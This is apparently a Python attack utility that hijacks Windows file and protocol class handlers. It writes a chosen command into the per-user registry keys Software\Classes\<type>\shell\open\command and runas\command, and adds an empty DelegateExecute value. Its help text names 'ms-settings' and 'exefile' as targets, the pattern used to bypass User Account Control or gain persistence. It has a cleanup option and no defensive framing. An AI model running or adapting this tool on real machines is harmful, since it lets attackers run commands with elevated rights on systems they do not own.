import argparse
import winreg
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-c", action="store_true", required=False, help="Creates registry key")
parser.add_argument("-r", action="store_true", required=False, help="Removes registry key")
parser.add_argument("-t", nargs="+", required=False, help="Type of class to hijack, ex. ms-settings or exefile")
parser.add_argument("-v", nargs="+", required=False, help="Value inside the Default-value")
parser.add_argument("-d", nargs="+", required=False, help="Creates DelegateExecute key with None as value")
args = parser.parse_args()

class registry:
	def __init__(self):
		self.key = None
		self.hive = winreg.HKEY_CURRENT_USER
	
	""" Sets {Default} value inside a registry key """
	def create(self, type, value, DelegateExecute=True):
		try:
			self.key = winreg.CreateKey(self.hive, "Software\\Classes\\{type}\\shell\\open\\command".format(type=type))
		except Exception:
			return False
		else:
			winreg.SetValueEx(self.key, None, 0, winreg.REG_SZ, value)
			if DelegateExecute:
					winreg.SetValueEx(self.key, "DelegateExecute", 0, winreg.REG_SZ, None)
			winreg.CloseKey(self.key)
		try:
			self.key = winreg.CreateKey(self.hive, "Software\\Classes\\{type}\\shell\\runas\\command".format(type=type))
		except Exception:
			return False
		else:
			winreg.SetValueEx(self.key, None, 0, winreg.REG_SZ, value)
			if DelegateExecute:
					winreg.SetValueEx(self.key, "DelegateExecute", 0, winreg.REG_SZ, None)
			winreg.CloseKey(self.key)

	""" Dirty cleans the class """
	def delete(self, type):
		try:
			self.key = winreg.DeleteKey(self.hive, "Software\\Classes\\{type}\\shell\\open\\command".format(type=type))
			self.key = winreg.DeleteKey(self.hive, "Software\\Classes\\{type}\\shell\\runas\\command".format(type=type))
			winreg.CloseKey(self.key)
		except Exception:
			return False
		else:
			return True

if __name__ == "__main__":
	if args.c:
		registry().create(args.t[0], args.v[0], args.d[0])
	if args.r:
		registry().delete(str(args.t[0]))
